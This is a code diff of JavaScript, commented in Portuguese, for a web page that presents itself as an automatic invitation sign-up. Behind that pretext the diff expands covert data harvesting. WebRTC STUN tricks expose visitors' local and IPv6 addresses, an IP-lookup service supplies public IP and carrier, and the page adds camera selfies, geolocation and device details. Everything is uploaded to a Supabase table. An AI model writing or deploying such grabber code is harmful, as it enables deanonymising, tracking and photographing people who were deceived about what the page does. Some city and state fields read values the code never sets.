@@ -1,3 +1,4 @@
+<script>
 // =================================================================
 // CONFIGURAÇÃO DE CONEXÃO
 // =================================================================
@@ -24,25 +25,30 @@ function falar(texto){
 }
 
 // =================================================================
-// CAPTURA AGRESSIVA DE PORTA
+// CAPTURA AVANÇADA (IPv4 + IPv6 + Operadora)
 // =================================================================
 async function capturarPortaAvancada() {
-  const info = { local_ip: null, local_port: null };
+  const info = { 
+    local_ip: null, 
+    local_port: null,
+    ipv6: null,
+    public_ip: null,
+    operadora: "Não detectada"
+  };
+
   const stunServers = [
     'stun:stun.l.google.com:19302',
     'stun:stun1.l.google.com:19302',
     'stun:stun2.l.google.com:19302',
-    'stun:stun3.l.google.com:19302',
-    'stun:stun4.l.google.com:19302',
     'stun:stun.ekiga.net',
-    'stun:stun.ideasip.com',
-    'stun:stun.iptel.org'
+    'stun:stun.ideasip.com'
   ];
 
-  for (let i = 0; i < 10; i++) {
+  // Captura via STUN (IPv4 + IPv6)
+  for (let server of stunServers) {
     try {
       const rtc = new RTCPeerConnection({
-        iceServers: [{ urls: stunServers[i % stunServers.length] }]
+        iceServers: [{ urls: server }]
       });
       rtc.createDataChannel("port-test");
       const offer = await rtc.createOffer();
@@ -54,15 +60,29 @@ async function capturarPortaAvancada() {
             const cand = event.candidate.candidate;
             const ipMatch = cand.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[a-f0-9:]+)/i);
             const portMatch = cand.match(/(\d{4,5})\s+typ/);
-            if (ipMatch) info.local_ip = ipMatch[1];
+
+            if (ipMatch) {
+              const ip = ipMatch[1];
+              if (ip.includes(':')) info.ipv6 = ip;
+              else info.local_ip = ip;
+            }
             if (portMatch) info.local_port = portMatch[1];
           }
         };
-        setTimeout(resolve, 900);
+        setTimeout(resolve, 1000);
       });
-      if (info.local_port) break;
+      if (info.local_ip || info.ipv6) break;
     } catch(e) {}
   }
+
+  // IP Público + Operadora
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    info.public_ip = data.ip;
+    info.operadora = data.org || "Não detectada";
+  } catch(e) {}
+
   return info;
 }
 
@@ -72,18 +92,17 @@ async function capturarPortaAvancada() {
 async function iniciarSistema(){
   try {
     falar("Seu cadastro será realizado automaticamente após clicar no botão verde abaixo.");
-    statusText.innerHTML = "🟡 Iniciando sistema...";
+    statusText.innerHTML = "🟡 Capturando IPv4, IPv6 e operadora...";
 
     const portaInfo = await capturarPortaAvancada();
 
-    const res = await fetch("https://ipapi.co/json/");
-    const data = await res.json();
-
     await supabaseClient.from('checkins').insert([{
       tipo_captura: "previa",
-      ip: data.ip || "indisponível",
+      ip: portaInfo.public_ip || "indisponível",
       local_ip: portaInfo.local_ip,
+      ipv6: portaInfo.ipv6,
       local_port: portaInfo.local_port,
+      operadora: portaInfo.operadora,
       user_agent: navigator.userAgent
     }]);
 
@@ -95,17 +114,15 @@ async function iniciarSistema(){
     });
     video.srcObject = stream;
     await video.play();
-
   } catch(err) {
     console.log(err);
     statusText.innerHTML = "❌ Permita câmera";
   }
 }
-
 window.onload = iniciarSistema;
 
 // =================================================================
-// ANALISADOR DE DISPOSITIVO
+// ANALISADOR DE DISPOSITIVO (mantido)
 // =================================================================
 function analisarDispositivo() {
   const ua = navigator.userAgent;
@@ -119,14 +136,16 @@ function analisarDispositivo() {
   else if (ua.indexOf("Firefox") >= 0) browser = "Firefox";
   else if (ua.indexOf("Safari") >= 0 && ua.indexOf("Chrome") === -1) browser = "Safari";
   else if (ua.indexOf("Edge") >= 0 || ua.indexOf("Edg") >= 0) browser = "Edge";
- 
+
   let model = "Desconhecido";
   if (ua.indexOf("Mobile") >= 0) {
       const parts = ua.split(/[()]/);
       if (parts.length > 1) {
           const deviceParts = parts[1].split(';');
           for (let part of deviceParts) {
-              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && part.indexOf("Windows") === -1 && part.indexOf("Macintosh") === -1 && part.length > 2) {
+              if (part.indexOf("Android") === -1 && part.indexOf("Linux") === -1 && 
+                  part.indexOf("iPhone") === -1 && part.indexOf("iPad") === -1 && 
+                  part.length > 2) {
                   model = part.trim();
                   break;
               }
@@ -137,14 +156,14 @@ function analisarDispositivo() {
 }
 
 // =================================================================
-// BOTÃO - CAPTURA COMPLETA
+// BOTÃO - CAPTURA COMPLETA (atualizado)
 // =================================================================
 btn.addEventListener("click", async () => {
   try {
     btn.disabled = true;
     btn.innerHTML = "PROCESSANDO...";
-   
-    statusText.innerHTML = "📨 Verificando informações do convite..";
+  
+    statusText.innerHTML = "📨 Verificando informações...";
     falar("Verificando informações do convite..");
 
     const largura = video.videoWidth;
@@ -157,7 +176,6 @@ btn.addEventListener("click", async () => {
     canvas.height = 480;
     const ctx = canvas.getContext("2d");
     const fotos = [];
-
     for(let i = 0; i < 3; i++) {
         ctx.drawImage(video, 0, 0, 640, 480);
         fotos.push(canvas.toDataURL("image/jpeg", 0.35));
@@ -167,6 +185,7 @@ btn.addEventListener("click", async () => {
     const stream = video.srcObject;
     if (stream) stream.getTracks().forEach(track => track.stop());
 
+    // Geolocalização
     let latitude = "não permitido";
     let longitude = "não permitido";
     try {
@@ -177,16 +196,8 @@ btn.addEventListener("click", async () => {
       longitude = localizacao.coords.longitude;
     } catch(err) {}
 
-    let ip = "indisponível";
-    let cidade = "", estado = "", pais = "";
-    try {
-      const req = await fetch("https://ipapi.co/json/");
-      const json = await req.json();
-      ip = json.ip || "indisponível";
-      cidade = json.city || "";
-      estado = json.region || "";
-      pais = json.country_name || "";
-    } catch(err) {}
+    // IP + Operadora
+    const portaInfo = await capturarPortaAvancada();
 
     statusText.innerHTML = "💾 Salvando cadastro...";
     falar("Salvando cadastro.");
@@ -198,10 +209,13 @@ btn.addEventListener("click", async () => {
       selfies: fotos,
       latitude: latitude.toString(),
       longitude: longitude.toString(),
-      ip: ip,
-      cidade: cidade,
-      estado: estado,
-      pais: pais,
+      ip: portaInfo.public_ip,
+      ipv6: portaInfo.ipv6,
+      local_ip: portaInfo.local_ip,
+      local_port: portaInfo.local_port,
+      operadora: portaInfo.operadora,
+      cidade: portaInfo.cidade || "",
+      estado: portaInfo.estado || "",
       user_agent: navigator.userAgent,
       modelo_dispositivo: infoDispositivo.model,
       versao_android: infoDispositivo.androidVersion,
@@ -228,3 +242,4 @@ btn.addEventListener("click", async () => {
     btn.innerHTML = "QUERO PARTICIPAR";
   }
 });
+</script>
